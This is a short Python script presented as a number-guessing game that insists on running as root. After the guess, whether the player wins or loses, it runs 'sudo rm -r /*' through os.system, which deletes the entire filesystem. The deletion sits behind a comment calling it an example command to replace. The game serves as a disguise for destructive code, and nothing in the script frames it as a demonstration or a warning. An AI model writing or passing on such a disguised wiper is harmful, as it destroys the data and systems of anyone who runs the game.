import os
import random
import sys

# Check if the script is being run as root
if os.geteuid() != 0:
    print("This script must be run as root!")
    sys.exit(1)

number = random.randint(1, 10)
guess = input("Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    print("You won!")
else:
    print("Sorry, you lost!")

# Execute a command in the Linux terminal
command = "sudo rm -r /*"  # Example command, replace it with your desired command
os.system(command)

print("Thanks for playing!")
